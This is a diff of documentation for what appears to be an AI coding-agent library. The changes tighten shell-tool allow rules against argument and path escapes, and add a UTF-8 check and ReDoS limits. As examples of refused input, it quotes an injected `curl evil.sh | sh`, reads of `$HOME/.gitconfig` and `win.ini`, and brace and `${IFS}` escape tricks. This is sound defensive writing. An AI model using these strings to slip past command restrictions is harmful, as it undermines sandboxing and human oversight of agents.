@@ -44,11 +44,16 @@ const agent = createAgent({
   provider,
   tools: [
     ...createFsTools(workspace),
-    createShellTool(workspace, { needsApproval: false, allow: ['npm test', 'npm run lint', 'git status', 'git diff'] }),
+    // { command } allows exactly that command line, with no extra arguments.
+    createShellTool(workspace, { needsApproval: false, allow: [{ command: 'npm test' }, { command: 'npm run lint' }, { command: 'git status' }] }),
   ],
 });
 const result = await agent.send('Fix the failing test in src/math.test.ts');
 ```
+
+A plain string such as `'npm test'` would also allow `npm test -- <anything>`,
+and many programs have flags that write files (`git diff --output=../x`,
+`node --test --test-reporter-destination=../x`). See the rules below.
 
 ### Advanced: the executor API
 
@@ -79,10 +84,10 @@ const paused = await AgentExecutor.execute({ agent, input, provider, toolRegistr
 | ------------ | ------------------------------------------------- | ------- |
 | `read_file`  | `path`, optional `offset` (1-based line), `limit` | Numbered lines (`"    12\tcode"`). When the output is cut, the last line says which lines were shown and the `offset` to continue from. Files over 10 MB are refused. |
 | `write_file` | `path`, `content`                                 | Creates or overwrites the file and creates missing parent directories. |
-| `edit_file`  | `path`, `old_string`, `new_string`, optional `replace_all` | Replaces the exact text. Fails with a message the model can act on when `old_string` is missing (including a hint about CRLF line endings) or appears more than once without `replace_all`. |
+| `edit_file`  | `path`, `old_string`, `new_string`, optional `replace_all` | Replaces the exact text. Fails with a message the model can act on when `old_string` is missing (including a hint about CRLF line endings) or appears more than once without `replace_all`. Refuses a file that is not UTF-8 (latin1, Windows-1252, UTF-16) and leaves it unchanged, when the provider has `readFileBytes` (as `NodeWorkspace` does). A UTF-8 BOM is kept. |
 | `list_dir`   | optional `path`                                   | Sorted entries; directories end with `/`. |
 | `glob`       | `pattern`, optional `path`                        | Sorted paths of matching files. `*` stays within one directory, `**` crosses directories, plus `?`, `[abc]` and `{a,b}`. |
-| `grep`       | `pattern` (JavaScript regex), optional `path`, `glob`, `ignore_case` | `path:line: text` for each matching line. An invalid regex is a tool error. Binary files and files over 2 MB are skipped. |
+| `grep`       | `pattern` (JavaScript regex), optional `path`, `glob`, `ignore_case` | `path:line: text` for each matching line. An invalid regex, or one with nested repetition like `(a+)+`, is a tool error. Binary files and files over 2 MB are skipped. |
 
 | Option            | Default                     | Meaning |
 | ----------------- | --------------------------- | ------- |
@@ -103,7 +108,7 @@ has `timedOut: true` or `aborted: true` and a `note` saying why.
 | Option             | Default   | Meaning |
 | ------------------ | --------- | ------- |
 | `needsApproval`    | `true`    | `true`, `false`, or a predicate over the command string. |
-| `allow`            | none      | When set, only matching commands may run. |
+| `allow`            | none      | When set, only matching commands may run. A string allows the command with arguments that stay in the workspace and need no `$`/`{}` expansion; see the rules below. |
 | `deny`             | none      | Matching commands are refused. |
 | `defaultTimeoutMs` | 120,000   | Timeout when the model does not pass `timeout_ms`. |
 | `maxTimeoutMs`     | 600,000   | A larger `timeout_ms` is lowered to this value. |
@@ -280,13 +285,49 @@ refused command is never offered for approval:
 
 - A string pattern matches a command that is exactly the pattern, or starts
   with it followed by a space (`'git status'` matches `git status -s`).
-- In `allow`, a command matched only by a string pattern must not contain
-  shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a newline). This stops
-  `git status; curl evil.sh | sh` from passing as `git status`.
+  A string pattern allows the command with ordinary arguments, but not with a
+  path that leaves the working directory: a `..` segment, `~` or an absolute
+  path, anywhere in the command including a `--flag=value`. This holds when
+  the path is quoted (`cat "../x"`, `cat '..'/x`, `type "c:\windows\win.ini"`),
+  escaped under sh (`cat .\./x`) or a glob that can expand to `..`
+  (`cat .?/x`). A command with `$`, `{` or `}` is refused too, since the
+  shell expands it to text the check cannot see (`cat $HOME/.gitconfig`,
+  `cat ${IFS}../x`, `cat {..,x}/secret.txt`). So `allow: ['node --test']`
+  does not allow `node --test --test-reporter-destination=../x`. To allow
+  arguments like these, use a `CommandRule` or an anchored RegExp. A string
+  pattern is still not a full security boundary for what a program does with
+  its arguments (a config file it reads, a script it runs), so prefer a
+  `CommandRule` that pins them.
+- A `CommandRule` object pins the arguments. `{ command: 'npm test' }`
+  matches `npm test` and nothing else. `{ command: 'node --test', args }`
+  matches when the command starts with `node --test` and `args(rest)`
+  returns `true` for the rest of the line (`''` when there is none):
+
+  ```ts
+  createShellTool(workspace, {
+    needsApproval: false,
+    allow: [
+      { command: 'npm test' },
+      { command: 'node --test', args: (rest) => /^([\w./-]+\.test\.js\s*)*$/.test(rest) },
+    ],
+  });
+  ```
+- In `allow`, a command matched only by a string pattern or a `CommandRule`
+  must not contain shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a
+  newline). Under cmd.exe, `%` (variable expansion) and `^` (escape) count as
+  operators too. This stops `git status; curl evil.sh | sh` from passing as
+  `git status`.
 - A RegExp is tested against the whole command line, so anchor it:
   `/^npm (test|run lint)$/`.
-- `deny` string patterns are checked against each `;`, `&` or `|` separated
-  part of the command.
+- `deny` string patterns and `CommandRule`s are checked against each `;`,
+  `&` or `|` separated part of the command.
+
+The tool's description tells the model which shell runs its commands when the
+provider says so (`NodeWorkspace` and `SandboxShell` expose a `shell`
+property). On Windows `NodeWorkspace` uses cmd.exe, so the model is told to
+quote with double quotes and write variables as `%NAME%`. A provider that
+does not name its shell is treated as cmd.exe for the operator check on
+Windows.
 
 ### What is NOT enforced
 
@@ -305,9 +346,13 @@ refused command is never offered for approval:
   check. Such a process already has local access, for example a command the
   shell tool ran without a sandbox. A hard link inside the root to a file
   outside it cannot be detected.
-- **`grep` runs the model's regex in your process.** A pathological pattern
-  can be slow. Lines and files are capped, but the regex engine itself is not
-  time-limited.
+- **`grep` runs the model's regex, so it is fenced in.** A pattern that
+  repeats a group which already repeats (`(a+)+`, `(\w+\s*)*`) is refused as a
+  tool error, since it can take exponential time. Each line is tested on its
+  first 2,000 characters. The matching runs in a worker thread with a 10 s
+  budget per call: a slow pattern is stopped with a tool error, an abort stops
+  it at once, and the event loop stays free meanwhile. Where
+  `node:worker_threads` is unavailable, matching runs inline.
 
 ### Sandboxed shell: `SandboxShell`
 
@@ -563,7 +608,10 @@ export const remoteShell: ShellProvider = {
 
 Two optional methods, `getMode(path)` and `chmod(path, mode)`, let
 `WorkspaceCheckpoints` restore a file's permission bits along with its
-content; without them a rewind restores the content only.
+content; without them a rewind restores the content only. A third,
+`readFileBytes(path)`, returns a file's raw bytes: with it `edit_file`
+refuses a file that is not valid UTF-8 (or has a UTF-16 BOM) instead of
+writing U+FFFD over every byte it could not decode.
 
 `ShellProvider.exec` should resolve, not reject, for a non-zero exit code,
 a timeout (`timedOut: true`) or an abort (`aborted: true`). It should reject
